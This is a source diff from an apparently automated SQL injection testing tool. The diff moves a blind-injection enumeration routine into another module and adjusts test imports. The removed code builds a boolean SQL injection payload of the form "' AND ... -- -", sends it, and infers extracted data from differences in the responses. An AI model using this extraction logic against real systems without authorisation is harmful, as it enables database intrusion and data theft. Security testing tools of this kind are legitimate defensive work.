-            let base = format!("' AND {cmp} -- -");
-            // Fresh RNG per oracle call from the run seed: deterministic per
-            // `--seed`, independent of async scheduling order.
-            let mut oracle_rng = crate::seeded_rng::make_rng(seed);
-            let payload = build_final_payload_with_rng(&base, &tampers, &popts, &mut oracle_rng);
-            // Transport/body errors are retried (bounded) then propagated as
-            // `Err` — never scored as `""`. The engine treats `Err` as an
-            // abstention/retry, so one hiccup cannot corrupt a bit.
-            let mut last_err: Option<String> = None;
-            for _ in 0..3 {
-                let Some(spec) = build_injection_spec_with_raw(
-                    &target,
-                    &target_str,
-                    &param,
-                    &payload,
-                    &marker_set,
-                    raw.as_ref(),
-                    opts,
-                    &popts,
-                ) else {
-                    warn!(pos, mid, "enum oracle spec build failed, retrying");
-                    last_err = Some("invalid header/cookie value".to_owned());
-                    continue;
-                };
-                let start = std::time::Instant::now();
-                let resp = client.send_with_retry(spec, &cancel).await;
-                let ms = start.elapsed().as_secs_f64() * 1000.0;
-                state.write().await.increment_requests();
-                let raw_body = match resp {
-                    Ok(r) => match client.read_body_string_with_timeout(r).await {
-                        Ok(b) => b,
-                        Err(e) => {
-                            warn!(error=%e, pos, mid, "enum oracle body read failed, retrying");
-                            last_err = Some(e.to_string());
-                            continue;
-                        }
-                    },
-                    Err(e) => {
-                        warn!(error=%e, pos, mid, "enum oracle probe failed, retrying");
-                        last_err = Some(e.to_string());
-                        continue;
-                    }
-                };
-                let body = matcher.pre_process(&raw_body);
-                let diff = crate::detection::response_diff::diff_against_baseline(
-                    &baseline_body,
-                    &body,
-                    baseline_mean_clone,
-                    ms,
-                    100.0,
-                );
-                return Ok::<bool, InjektError>(diff.confidence < 0.4);
-            }
-            Err::<bool, InjektError>(InjektError::Http(format!(
-                "enum oracle transport failure at pos {pos} mid {mid}: {}",
-                last_err.unwrap_or_else(|| "unknown".to_owned())
-            )))
-        }
-    };
-
-    let extracted = match engine.extract(inferred_len, oracle, cancel).await {
-        Ok(value) => value,
-        Err(crate::error::InjektError::Cancelled) => {
-            return Err(crate::error::InjektError::Cancelled);
-        }
-        Err(error) => {
-            // Speculative helper: an unstable oracle on a non-boolean sink is
-            // the expected negative, not an actionable error. Demote to debug
-            // so bulk scans don't drown in `inference inconsistency` noise.
-            tracing::debug!(label=%label, error=%error, "enum oracle unstable, skipping field");
-            return Ok(None);
-        }
-    };
-    let exposed = {
-        use secrecy::ExposeSecret;
-        extracted.expose_secret().to_owned()
-    };
-    info!(label=%label, extracted=%crate::session::scrubber::Scrubber::hash_truncated(&exposed), len=%exposed.len(), "enumeration extracted");
-    Ok(Some(exposed))
-}
+/// Enumeration phase (sweep loop) moved to `super::enumerate` (P1).
+/// Re-exported here for intra-engine callers during migration.
+pub(crate) use super::enumerate::run_enumeration;
 
 #[cfg(test)]
 #[allow(clippy::unwrap_used, clippy::expect_used)]
 mod orchestrator_gating_tests {
     use super::{
-        ConfirmScope, apply_outcome_to_hypothesis, dbms_payload_label, has_confirmed_finding,
-        in_confirm_scope, infer_signal_and_trials, is_confirmed_finding, is_extraction_eligible,
+        ConfirmScope, apply_outcome_to_hypothesis, has_confirmed_finding, in_confirm_scope,
+        infer_signal_and_trials, is_confirmed_finding, is_extraction_eligible,
         needs_auto_second_pass, parse_finding_dbms,
     };
     use crate::engine::{
         confirm::dbms_label_from_finding,
-        schedule::{order_boolean_by_context, order_by_prefix_for_context},
+        schedule::{dbms_payload_label, order_boolean_by_context, order_by_prefix_for_context},
     };
     use crate::{
         dbms::{
